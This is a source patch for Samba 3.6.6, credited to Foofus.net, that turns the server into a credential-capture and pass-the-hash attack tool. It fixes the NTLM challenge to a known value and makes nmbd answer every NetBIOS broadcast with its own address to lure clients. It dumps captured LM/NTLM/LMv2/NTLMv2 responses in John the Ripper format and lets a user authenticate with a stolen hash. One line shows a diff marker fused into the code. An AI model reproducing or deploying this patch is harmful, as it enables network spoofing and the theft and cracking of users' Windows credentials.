@@ -1,0 +1,600 @@
+diff -rupN samba-3.6.6/libcli/auth/smbencrypt.c samba-3.6.6-patched/libcli/auth/smbencrypt.c
+--- samba-3.6.6/libcli/auth/smbencrypt.c	2012-06-24 13:21:16.000000000 -0400
++++ samba-3.6.6-patched/libcli/auth/smbencrypt.c	2012-06-30 11:31:19.000000000 -0400
+@@ -45,6 +45,9 @@ void SMBencrypt_hash(const uint8_t lm_ha
+ #endif
+ }
+ 
++#define SMB_HASH_LM 1
++#define SMB_HASH_NTLM 2
++
+ /*
+    This implements the X/Open SMB password encryption
+    It takes a password ('unix' string), a 8 byte "crypt key"
+@@ -63,6 +66,63 @@ bool SMBencrypt(const char *passwd, cons
+ 	return ret;
+ }
+ 
++/*
++   Support for using LM/NTLM hashes -- jmk@foofus.net 10/2006 
++   Greets: Foofus, Phenfen, Omi, Fizzgig, pMonkey
++*/
++void E_set_hash(int type, uchar hash[16])
++{
++ uint l;
++ char p[1024];
++ int i, j;
++ char HexChar;
++ int HexValue;
++
++ if ( (getenv("SMBHASH")) && (strlen(getenv("SMBHASH")) == 65) )
++ {
++    memset(p, 0, 1024);
++   strncpy(p, getenv("SMBHASH"), 1024);
++
++    /* Replace "NO PASSWORD*********************" */
++    if ((type == SMB_HASH_LM) && (strncmp(p, "N", 1) == 0))
++      strncpy(p, "AAD3B435B51404EEAAD3B435B51404EE", 32);
++    else if ((type == SMB_HASH_NTLM) && (strncmp(p+33, "N", 1) == 0))
++      strncpy(p+33, "31D6CFE0D16AE931B73C59D7E0C089C0", 32);
++    
++   for (i=0; i<16; i++) {
++     HexValue = 0x0;
++     for (j=0; j<2; j++) {
++       if (type == SMB_HASH_LM)
++         HexChar = (char)p[2*i+j];
++       else
++         HexChar = (char)p[2*i+j+33];
++
++       if (HexChar > 0x39)
++         HexChar = HexChar | 0x20;  /* convert upper case to lower */
++
++       if (!(((HexChar >= 0x30) && (HexChar <= 0x39))||   /* 0 - 9 */
++          ((HexChar >= 0x61) && (HexChar <= 0x66)))) {    /* a - f */
++         fprintf(stderr, "Error invalid char (%c) for hash.\n", HexChar);
++         exit(1);
++       }
++
++       HexChar -= 0x30;
++       if (HexChar > 0x09)  /* HexChar is "a" - "f" */
++         HexChar -= 0x27;
++
++       HexValue = (HexValue << 4) | (char)HexChar;
++     }
++     hash[i] = (uchar)HexValue;
++   }
++ }
++ else
++ {
++   fprintf(stderr, "Error reading SMB HASH.\n");
++   fprintf(stderr, "\tEx: export SMBHASH=\"_LM_HASH_:_NTLM_HASH_\"\n");
++   exit(1);
++ }
++}
++
+ /**
+  * Creates the MD4 Hash of the users password in NT UNICODE.
+  * @param passwd password in 'unix' charset.
+@@ -75,18 +135,26 @@ bool E_md4hash(const char *passwd, uint8
+ 	smb_ucs2_t *wpwd;
+ 	bool ret;
+ 
+-	ret = push_ucs2_talloc(NULL, &wpwd, passwd, &len);
+-	if (!ret || len < 2) {
+-		/* We don't want to return fixed data, as most callers
+-		 * don't check */
+-		mdfour(p16, (const uint8_t *)passwd, strlen(passwd));
+-		return false;
+-	}
++	/* Support for using NTLM hashes -- jmk@foofus.net 10/2006 */
++        /* Added to SMB-3.6.6 by exfil -- eescobar@gmail.com 06/2012 */
+ 
+-	len -= 2;
+-	mdfour(p16, (const uint8_t *)wpwd, len);
++	if (getenv("SMBHASH")) {
++		fprintf(stderr, "HASH PASS: Substituting user supplied NTLM HASH...\n");
++		E_set_hash(SMB_HASH_NTLM, p16);
++	} else {
++		ret = push_ucs2_talloc(NULL, &wpwd, passwd, &len);
++		if (!ret || len < 2) {
++			/* We don't want to return fixed data, as most callers
++		 	* don't check */
++			mdfour(p16, (const uint8_t *)passwd, strlen(passwd));
++			return false;
++		}
++
++		len -= 2;
++		mdfour(p16, (const uint8_t *)wpwd, len);
+ 
+-	talloc_free(wpwd);
++		talloc_free(wpwd);
++	}
+ 	return true;
+ }
+ 
+@@ -120,18 +188,24 @@ bool E_deshash(const char *passwd, uint8
+ 	char dospwd[256];
+ 	ZERO_STRUCT(dospwd);
+ 
+-	/* Password must be converted to DOS charset - null terminated, uppercase. */
+-	push_string(dospwd, passwd, sizeof(dospwd), STR_ASCII|STR_UPPER|STR_TERMINATE);
+-
+-	/* Only the first 14 chars are considered, password need not be null terminated. */
+-	E_P16((const uint8_t *)dospwd, p16);
++	/* Support for using LM hashes -- jmk@foofus.net 10/2006 */
++	/* Added to Samba-3.6.6 by exfil - eescobar@gmail.com 06/2012 */
++	if (getenv("SMBHASH")) {
++		fprintf(stderr, "HASH PASS: Substituting user supplied LM HASH...\n");
++		E_set_hash(SMB_HASH_LM, p16);
++	} else {
++		/* Password must be converted to DOS charset - null terminated, uppercase. */
++		push_string(dospwd, passwd, sizeof(dospwd), STR_ASCII|STR_UPPER|STR_TERMINATE);
+ 
+-	if (strlen(dospwd) > 14) {
+-		ret = false;
+-	}
++		/* Only the first 14 chars are considered, password need not be null terminated. */
++		E_P16((const uint8_t *)dospwd, p16);
+ 
+-	ZERO_STRUCT(dospwd);
++		if (strlen(dospwd) > 14) {
++			ret = false;
++		}
+ 
++		ZERO_STRUCT(dospwd);
++	}
+ 	return ret;
+ }
+ 
+diff -rupN samba-3.6.6/source3/auth/auth.c samba-3.6.6-patched/source3/auth/auth.c
+--- samba-3.6.6/source3/auth/auth.c	2012-06-24 13:21:16.000000000 -0400
++++ samba-3.6.6-patched/source3/auth/auth.c	2012-06-30 15:17:06.000000000 -0400
+@@ -84,6 +84,7 @@ static NTSTATUS get_ntlm_challenge(struc
+ 	DATA_BLOB challenge = data_blob_null;
+ 	const char *challenge_set_by = NULL;
+ 	auth_methods *auth_method;
++	char addr[INET6_ADDRSTRLEN];
+ 
+ 	if (auth_context->challenge.length) {
+ 		DEBUG(5, ("get_ntlm_challenge (auth subsystem): returning previous challenge by module %s (normal)\n", 
+@@ -121,14 +122,19 @@ static NTSTATUS get_ntlm_challenge(struc
+ 	}
+ 
+ 	if (!challenge_set_by) {
+-		uchar tmp[8];
++		uchar tmp[8] = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
++		int i;
+ 
+-		generate_random_buffer(tmp, sizeof(tmp));
+ 		auth_context->challenge = data_blob_talloc(auth_context,
+ 							   tmp, sizeof(tmp));
+ 
+ 		challenge_set_by = "random";
+-		auth_context->challenge_may_be_modified = True;
++		auth_context->challenge_may_be_modified = False;
++		DEBUG(0, ("*** Fixed LM/NTLM Challenge Samba Attack -- Foofus.net/JoMo-Kun **\n"));
++		DEBUGADD(0, ("Set Sserver challenge: "));
++		for (i=0; i<auth_context->challenge.length; i++)
++			DEBUGADD(0, ("%2.2X", 0xFF & (int)auth_context->challenge.data[i]));
++		DEBUGADD(0, ("\n"));
+ 	} 
+ 
+ 	DEBUG(5, ("auth_context challenge created by %s\n", challenge_set_by));
+@@ -211,9 +217,224 @@ static NTSTATUS check_ntlm_password(cons
+ 	const char *unix_username;
+ 	auth_methods *auth_method;
+ 	TALLOC_CTX *mem_ctx;
++	char addr[INET6_ADDRSTRLEN];
++	int i;
++	char *pathname;
++	char *filename;
++	char *tempname;
++	FILE *fp;
+ 
+ 	if (!user_info || !auth_context || !server_info)
+ 		return NT_STATUS_LOGON_FAILURE;
++  /*
++    Log LM/NTLM/LMv2/NTLMv2 Challenge/Response in John Format
++    JoMo-Kun <jmk@foofus.net>
++
++    LM/NTLM:  foo::WORKGROUP:CE405C5D91855E70037AD5CE629468162F85252CC731BB25:7A511D2B8026DB6A39C9336499066989896655F7098C6AFE:1122334455667788
++    LMv2:     foo::DOMAIN:1122334455667788:9505205EEBFA963FC6542214BC6F10B3:1122334455667788
++    NTLMv2:   foo::DOMAIN:1122334455667788:D2F416FEC25701255A6DAA1175CA0FFA:01010000000000005931A63E06ABCA011142C097A178270B0000000002000E00760062006F0078007300720076000000000000000000
++  */
++  DEBUGADD(0,("\n*** Logging LM/NTLM/LMv2/NTLMv2 Challenge/Response Exchanges to File (John/jtr Format) ***\n"));
++
++  DEBUGADD(0, ("User: %s\n", user_info->client.account_name));
++  DEBUGADD(0, ("Domain: %s\n", user_info->client.domain_name));
++  DEBUGADD(0, ("Workstation Name: %s\n", user_info->workstation_name));
++
++  DEBUGADD(0, ("Server Challenge: "));
++  for (i=0; i<auth_context->challenge.length; i++)
++    DEBUGADD(0, ("%2.2X", 0xFF & (int)auth_context->challenge.data[i]));
++  DEBUGADD(0, ("\n"));
++  
++  /* LM / NTLM */ 
++  if ((user_info->password.response.lanman.length == 24) &&
++      (user_info->password.response.nt.length == 24))
++  {
++    DEBUGADD(0, ("LMv1 Client Response: "));
++    for (i=0; i < user_info->password.response.lanman.length; i++)
++      DEBUGADD(0, ("%2.2X", 0xFF & (int)user_info->password.response.lanman.data[i]));
++    DEBUGADD(0, ("\n"));
++
++    DEBUGADD(0, ("NTLMv1 Client Response: "));
++    for (i=0; i < user_info->password.response.nt.length; i++)
++      DEBUGADD(0, ("%2.2X", 0xFF & (int)user_info->password.response.nt.data[i]));
++    DEBUGADD(0, ("\n"));
++  } 
++  /* LMv2 / NTLMv2 */
++  else 
++  {
++    if (user_info->password.response.lanman.length == 24)
++    {
++      DEBUGADD(0, ("LMv2 Client Challenge: "));
++      for (i=0; i<16; i++)
++        DEBUGADD(0, ("%2.2X", 0xFF & (int)user_info->password.response.lanman.data[i]));
++      DEBUGADD(0, ("\n"));
++
++      DEBUGADD(0, ("LMv2 Client Response: "));
++      for (i=16; i < user_info->password.response.lanman.length; i++)
++        DEBUGADD(0, ("%2.2X", 0xFF & (int)user_info->password.response.lanman.data[i]));
++      DEBUGADD(0, ("\n"));
++    }  
++
++    if (user_info->password.response.nt.length != 0)
++    {
++      DEBUGADD(0, ("NTLMv2 Client Challenge: "));
++      for (i=0; i<16; i++)
++        DEBUGADD(0, ("%2.2X", 0xFF & (int)user_info->password.response.nt.data[i]));
++      DEBUGADD(0, ("\n"));
++
++      DEBUGADD(0, ("NTLMv2 Client Response: "));
++      for (i=16; i < user_info->password.response.nt.length; i++)
++        DEBUGADD(0, ("%2.2X", 0xFF & (int)user_info->password.response.nt.data[i]));
++      DEBUGADD(0, ("\n"));
++    }
++    else
++    {
++      DEBUGADD(0, ("*** WARNING: Unable to determine if hash is LMv1 or LMv2 (Logged as LMv2) ***\n"));
++    } 
++  }
++
++  /* Set Logging Path */
++  if ( strlen(lp_logfile()) != 0 )
++  {
++    filename = lp_logfile();
++    tempname = strrchr(filename, '/');
++    pathname = malloc(tempname - filename + 1);
++    memset(pathname, 0, tempname - filename + 1);
++    strncpy(pathname, filename, tempname - filename);
++  }
++  else
++  {
++    pathname = malloc(5);
++    memset(pathname, 0, 5);
++    snprintf(pathname, 4, "/tmp");
++  }
++
++  /* Set Log File Name */
++  if ((user_info->password.response.lanman.length == 24) && (user_info->password.response.nt.length != 24))
++  {
++    /* Windows 7 LMv2 Response: 00000000000000000000000000000000 */
++    if (user_info->password.response.lanman.data[0] == 0x00) /* Extract NTLMv2 */
++    {
++      filename = malloc(strlen(pathname) + 15 + 1);
++      memset(filename, 0, strlen(pathname) + 15 + 1);
++      snprintf(filename, strlen(pathname) + 15 + 1, "%s/dump.NETNTLMv2", pathname);
++    }
++    else /* Extract LMv2 */
++    {
++      filename = malloc(strlen(pathname) + 13 + 1);
++      memset(filename, 0, strlen(pathname) + 13 + 1);
++      snprintf(filename, strlen(pathname) + 13 + 1, "%s/dump.NETLMv2", pathname);
++    }
++  }
++  else if ((user_info->password.response.lanman.length == 24) && (user_info->password.response.nt.length == 24))
++  {
++    filename = malloc(strlen(pathname) + 11 + 1);
++    memset(filename, 0, strlen(pathname) + 11 + 1);
++    snprintf(filename, strlen(pathname) + 11 + 1, "%s/dump.NETLM", pathname);
++  }
++  else
++  {
++    DEBUGADD(0,("Failed to identify LM/NTLM/LMv2/NTLMv2 hashes based on length.\n"));
++    filename = NULL;
++  }
++
++  DEBUGADD(0,("Set LM/NTLM/LMv2/NTLMv2 Dump File:%s\n", filename));
++  free(pathname);
++  fp = fopen(filename, "a");
++
++  if (fp == NULL) {
++    DEBUGADD(0, ("Failed to Open Dump File.\n"));
++  }
++  /* Log LMv2/NTLMv2 Challenge/Response */
++  /* LMv2:    USER::DOMAIN:1122334455667788:498B5E245BAFA65E56334B28E3F501CF:6FE8BB5B66ED5892 */
++  /* NTLMv2:  USER::DOMAIN:1122334455667788:D2F416FEC25701255A6DAA1175CA0FFA:01010000000000005931A63E06ABCA011142C097A178270B0000000002000E00760062006F0078007300720076000000000000000000 */
++  else if ((user_info->password.response.lanman.length == 24) && (user_info->password.response.nt.length != 24))
++  {
++    DEBUGADD(0,("Dumping LMv2 Response\n"));
++
++    /* Client Username */
++    fprintf(fp, "%s::", user_info->client.account_name);
++
++    /* Client Domain */
++    if (strlen(user_info->client.domain_name) != 0)
++      fprintf(fp, "%s:", user_info->client.domain_name);
++    else
++      fprintf(fp, ":");
++
++    /* Server Challenge - Fixed 1122334455667788 */
++    for (i=0; i<auth_context->challenge.length; i++)
++      fprintf(fp, "%2.2X", (0xFF & (int)auth_context->challenge.data[i]));
++      
++    fprintf(fp, ":");
++
++    /* Windows 7 LMv2 Response: 00000000000000000000000000000000 -- Record NTLMv2 Instead */
++    if (user_info->password.response.lanman.data[0] == 0x00)
++    {
++      /* CLient NTLMv2 Response */
++      for (i=0; i<16; i++)+        fprintf(fp, "%2.2X", (0xFF & (int)user_info->password.response.nt.data[i]));
++
++      fprintf(fp, ":");
++
++      /* Client NTLMv2 Challenge */
++      for (i=16; i < user_info->password.response.nt.length; i++)
++        fprintf(fp, "%2.2X", (0xFF & (int)user_info->password.response.nt.data[i]));
++    }
++    else
++    {
++      /* CLient LMv2 Response */
++      for (i=0; i<16; i++)
++        fprintf(fp, "%2.2X", (0xFF & (int)user_info->password.response.lanman.data[i]));
++
++      fprintf(fp, ":");
++
++      /* Client LMv2 Challenge */
++      for (i=16; i < user_info->password.response.lanman.length; i++)
++        fprintf(fp, "%2.2X", (0xFF & (int)user_info->password.response.lanman.data[i]));
++    }
++
++    fprintf(fp, "\n");
++
++    fclose(fp);
++  }
++  /* Log LM/NTLM Challenge/Response */
++  /* USER::DOMAIN:CE405C5D91855E70037AD5CE629468162F85252CC731BB25:7A511D2B8026DB6A39C9336499066989896655F7098C6AFE:1122334455667788 */
++  else if ((user_info->password.response.lanman.length == 24) && (user_info->password.response.nt.length == 24))
++  {
++    DEBUGADD(0,("Dumping LM/NTLM Response\n"));
++
++    /* Client Username */
++    fprintf(fp, "%s::", user_info->client.account_name);
++
++    /* Client Domain */
++    if (strlen(user_info->client.domain_name) != 0)
++      fprintf(fp, "%s:", user_info->client.domain_name);
++    else
++      fprintf(fp, ":");
++
++    /* Client LM Response */
++    for (i=0; i < user_info->password.response.lanman.length; i++)
++      fprintf(fp,"%2.2X", 0xFF & (int)user_info->password.response.lanman.data[i] );
++
++    fprintf(fp, ":");
++
++    /* Client NTLM Response */
++    for (i=0; i < user_info->password.response.nt.length; i++)
++      fprintf(fp,"%2.2X", 0xFF & (int)user_info->password.response.nt.data[i] );
++
++    fprintf(fp, ":");
++
++    /* Server Challenge - Fixed 1122334455667788 */
++    for (i=0; i<auth_context->challenge.length; i++)
++      fprintf(fp, "%2.2X", (0xFF & (int)auth_context->challenge.data[i]));
++
++    fprintf(fp, "\n");
++
++    fclose(fp);
++  }
++
++  DEBUGADD(0, ("*** Completed Dumping Challenge/Response ***\n"));
++
++  /* ************************************* */
+ 
+ 	DEBUG(3, ("check_ntlm_password:  Checking password for unmapped user [%s]\\[%s]@[%s] with the new password interface\n", 
+ 		  user_info->client.domain_name, user_info->client.account_name, user_info->workstation_name));
+diff -rupN samba-3.6.6/source3/nmbd/nmbd.c samba-3.6.6-patched/source3/nmbd/nmbd.c
+--- samba-3.6.6/source3/nmbd/nmbd.c	2012-06-24 13:21:16.000000000 -0400
++++ samba-3.6.6-patched/source3/nmbd/nmbd.c	2012-06-30 11:48:39.000000000 -0400
+@@ -861,6 +861,10 @@ static bool open_sockets(bool isdaemon, 
+ 	DEBUG(0,("nmbd version %s started.\n", samba_version_string()));
+ 	DEBUGADD(0,("%s\n", COPYRIGHT_STARTUP_MESSAGE));
+ 
++	DEBUGADD(0, ("\n----------------------------------------------------------\n"));
++	DEBUGADD(0, ("*** NMB Broadcast Auto-Response -- Foofus.Net/JoMo-Kun ***\n"));
++	DEBUGADD(0, ("----------------------------------------------------------\n\n"));
++
+ 	if (!lp_load_initial_only(get_dyn_CONFIGFILE())) {
+ 		DEBUG(0, ("error opening config file\n"));
+ 		exit(1);
+diff -rupN samba-3.6.6/source3/nmbd/nmbd_incomingrequests.c samba-3.6.6-patched/source3/nmbd/nmbd_incomingrequests.c
+--- samba-3.6.6/source3/nmbd/nmbd_incomingrequests.c	2012-06-24 13:21:16.000000000 -0400
++++ samba-3.6.6-patched/source3/nmbd/nmbd_incomingrequests.c	2012-06-30 11:50:48.000000000 -0400
+@@ -451,9 +451,18 @@ void process_name_query_request(struct s
+ 	struct name_record *namerec = NULL;
+ 	int reply_data_len = 0;
+ 	int i;
++	int num_ips;
+ 	
+ 	DEBUG(3,("process_name_query_request: Name query from %s on subnet %s for name %s\n", 
+ 		 inet_ntoa(p->ip), subrec->subnet_name, nmb_namestr(question)));
++
++	/* ********************************************************************************* */
++  	/* 
++     		Hack to make nmbd respond with our IP for all NMB broadcasts.
++     		Based on ideas from Karma (http://www.theta44.org/karma/). 
++     		JoMo-Kun <jmk@foofus.net> [02/2007]
++  	*/
++ 
+   
+ 	/* Look up the name in the cache - if the request is a broadcast request that
+ 	   came from a subnet we don't know about then search all the broadcast subnets
+@@ -464,6 +473,33 @@ void process_name_query_request(struct s
+ 	else
+ 		namerec = find_name_on_subnet(subrec, question, FIND_ANY_NAME);
+ 
++	/* Create Response Packet */
++	DEBUGADD(0, ("[%s] NetBIOS Broadcast Request: %s\n", inet_ntoa(p->ip), question->name) );
++
++	/* Don't respond to broadcasts which match our ignore list */
++  	//if ( strcmp(inet_ntoa(p->ip), "10.71.0.160") == 0 )
++  	//{
++  	//  DEBUGADD(0, ("[%s] Skipping NetBIOS Broadcast Request based on host ignore list.\n", inet_ntoa(p
++  	//  namerec = NULL;
++  	//}
++  	//else
++ 	 //{
++    	namerec = SMB_MALLOC_P(struct name_record);
++    	memset( (char *)namerec, '\0', sizeof(*namerec) );
++    	namerec->subnet = subrec;
++    	make_nmb_name(&namerec->name, question->name, 0x00);
++    	namerec->data.nb_flags = NB_ACTIVE;
++    	namerec->data.wins_flags = WINS_ACTIVE;
++    	namerec->data.nb_flags = NB_PERM;
++    	namerec->data.source = SELF_NAME;
++    	num_ips = iface_count(); 
++    	namerec->data.num_ips = num_ips;
++    	namerec->data.ip = SMB_MALLOC_ARRAY( struct in_addr, num_ips );
++    	memcpy( (namerec->data.ip), &subrec->myip, num_ips * sizeof(struct in_addr) );
++   	//}
++
++  	/* ********************************************************************************* */
++
+ 	/* Check if it is a name that expired */
+ 	if (namerec && 
+ 	    ((namerec->data.death_time != PERMANENT_TTL) && 
+diff -rupN samba-3.6.6/source3/smbd/negprot.c samba-3.6.6-patched/source3/smbd/negprot.c
+--- samba-3.6.6/source3/smbd/negprot.c	2012-06-24 13:21:16.000000000 -0400
++++ samba-3.6.6-patched/source3/smbd/negprot.c	2012-06-30 15:15:04.000000000 -0400
+@@ -281,6 +281,7 @@ static void reply_nt1(struct smb_request
+ 	struct timespec ts;
+ 	ssize_t ret;
+ 	struct smbd_server_connection *sconn = req->sconn;
++	char addr[INET6_ADDRSTRLEN];
+ 
+ 	sconn->smb1.negprot.encrypted_passwords = lp_encrypted_passwords();
+ 
+@@ -399,6 +400,8 @@ static void reply_nt1(struct smb_request
+ 			return;
+ 		}
+ 		DEBUG(3,("not using SPNEGO\n"));
++		DEBUGADD(0, ("[%s] Simple and Protected GSSAPI Negotation Mechanism (SPNEG) Disabled.\n", 
++				client_addr(sconn->sock, addr, sizeof(addr))));
+ 	} else {
+ 		DATA_BLOB spnego_blob = negprot_spnego(req, req->sconn);
+ 
+@@ -417,6 +420,9 @@ static void reply_nt1(struct smb_request
+ 
+ 		SCVAL(req->outbuf,smb_vwv16+1, 0);
+ 		DEBUG(3,("using SPNEGO\n"));
++
++		DEBUGADD(0, ("[%s] Simple and Protected GSSAPI Negotiation Mechanism (SPNEG) Enabled (NTLMv2).\n",
++			client_addr(sconn->sock, addr, sizeof(addr))));
+ 	}
+ 
+ 	return;
+@@ -541,6 +547,7 @@ void reply_negprot(struct smb_request *r
+ 	int i;
+ 	size_t converted_size;
+ 	struct smbd_server_connection *sconn = req->sconn;
++	char addr[INET6_ADDRSTRLEN];
+ 
+ 	START_PROFILE(SMBnegprot);
+ 
+@@ -702,8 +709,10 @@ void reply_negprot(struct smb_request *r
+ 		reload_services(sconn->msg_ctx, sconn->sock, True);
+ 		supported_protocols[protocol].proto_reply_fn(req, choice);
+ 		DEBUG(3,("Selected protocol %s\n",supported_protocols[protocol].proto_name));
++		DEBUGADD(0, ("[%s] Selected protocol: %s]n", client_addr(sconn->sock, addr, sizeof(addr)), supported_protocols[protocol].proto_name));
+ 	} else {
+ 		DEBUG(0,("No protocol supported !\n"));
++		DEBUG(0, ("[%s] No protocol supported !\n", client_addr(sconn->sock, addr, sizeof(addr))));
+ 		reply_outbuf(req, 1, 0);
+ 		SSVAL(req->outbuf, smb_vwv0, choice);
+ 	}
+diff -rupN samba-3.6.6/source3/smbd/reply.c samba-3.6.6-patched/source3/smbd/reply.c
+--- samba-3.6.6/source3/smbd/reply.c	2012-06-24 13:21:16.000000000 -0400
++++ samba-3.6.6-patched/source3/smbd/reply.c	2012-06-30 15:15:39.000000000 -0400
+@@ -499,6 +499,7 @@ void reply_special(struct smbd_server_co
+ {
+ 	int msg_type = CVAL(inbuf,0);
+ 	int msg_flags = CVAL(inbuf,1);
++	char addr[INET6_ADDRSTRLEN];
+ 	/*
+ 	 * We only really use 4 bytes of the outbuf, but for the smb_setlen
+ 	 * calculation & friends (srv_send_smb uses that) we need the full smb
+@@ -552,6 +553,10 @@ void reply_special(struct smbd_server_co
+ 		DEBUG(2,("netbios connect: name1=%s0x%x name2=%s0x%x\n",
+ 			 name1, name_type1, name2, name_type2));
+ 
++		DEBUGADD(0, ("[%s] Server NetBIOS Name: %s\n", client_addr(sconn->sock, addr, sizeof(addr)),
++			name1));
++		DEBUGADD(0, ("[%s] Client NetBIOS Name: %s\n", client_addr(sconn->sock, addr, sizeof(addr)), name2));
++
+ 		if (netbios_session_retarget(sconn, name1, name_type1)) {
+ 			exit_server_cleanly("retargeted client");
+ 		}
+@@ -635,6 +640,7 @@ void reply_tcon(struct smb_request *req)
+ 	DATA_BLOB password_blob;
+ 	TALLOC_CTX *ctx = talloc_tos();
+ 	struct smbd_server_connection *sconn = req->sconn;
++	char addr[INET6_ADDRSTRLEN];
+ 
+ 	START_PROFILE(SMBtcon);
+ 
+@@ -711,6 +717,7 @@ void reply_tcon_and_X(struct smb_request
+ 	const char *p, *q;
+ 	uint16 tcon_flags;
+ 	struct smbd_server_connection *sconn = req->sconn;
++	char addr[INET6_ADDRSTRLEN];
+ 
+ 	START_PROFILE(SMBtconX);
+ 
+@@ -792,6 +799,7 @@ void reply_tcon_and_X(struct smb_request
+ 	}
+ 
+ 	DEBUG(4,("Client requested device type [%s] for share [%s]\n", client_devicetype, service));
++	DEBUGADD(0, ("[%s] Device Type: %s Share %s\n", client_addr(sconn->sock, addr, sizeof(addr)), client_devicetype, service));
+ 
+ 	conn = make_connection(sconn, service, password, client_devicetype,
+ 			       req->vuid, &nt_status);
+diff -rupN samba-3.6.6/source3/smbd/sesssetup.c samba-3.6.6-patched/source3/smbd/sesssetup.c
+--- samba-3.6.6/source3/smbd/sesssetup.c	2012-06-24 13:21:16.000000000 -0400
++++ samba-3.6.6-patched/source3/smbd/sesssetup.c	2012-06-30 15:17:45.000000000 -0400
+@@ -1393,6 +1393,7 @@ void reply_sesssetup_and_X(struct smb_re
+ 		const uint8_t *p = req->buf;
+ 		const uint8_t *save_p = req->buf;
+ 		uint16 byte_count;
++		char addr[INET6_ADDRSTRLEN];
+ 
+ 
+ 		if(global_client_caps == 0) {
+@@ -1531,7 +1532,15 @@ void reply_sesssetup_and_X(struct smb_re
+ 			primary_domain = talloc_strdup(talloc_tos(), "null");
+ 		}
+ 
+-		DEBUG(3,("Domain=[%s]  NativeOS=[%s] NativeLanMan=[%s] "
++	    /* JoMo-Kun <jmk@foofus.net> */
++    	DEBUGADD(0, ("[%s] SMB Version 1 Connection\n", client_addr(sconn->sock, addr, sizeof(addr))));
++    	DEBUGADD(0, ("[%s] Client Name: %s Remote Machine Name: %s\n", client_addr(sconn->sock, addr, sizeof(addr)), client_name(sconn->sock), get_remote_machine_name()));
++    	DEBUGADD(0, ("[%s] User: %s\n", client_addr(sconn->sock, addr, sizeof(addr)), user));
++    	DEBUGADD(0, ("[%s] Domain: %s\n", client_addr(sconn->sock, addr, sizeof(addr)), domain));
++    	DEBUGADD(0, ("[%s] Primary Domain: %s\n", client_addr(sconn->sock, addr, sizeof(addr)), primary_domain));
++    	DEBUGADD(0, ("[%s] Native OS: %s\n", client_addr(sconn->sock, addr, sizeof(addr)), native_os));
++    	DEBUGADD(0, ("[%s] Native LanMan: %s\n", client_addr(sconn->sock, addr, sizeof(addr)), native_lanman));
++	DEBUG(3,("Domain=[%s]  NativeOS=[%s] NativeLanMan=[%s] "
+ 			"PrimaryDomain=[%s]\n",
+ 			domain, native_os, native_lanman, primary_domain));
+ 
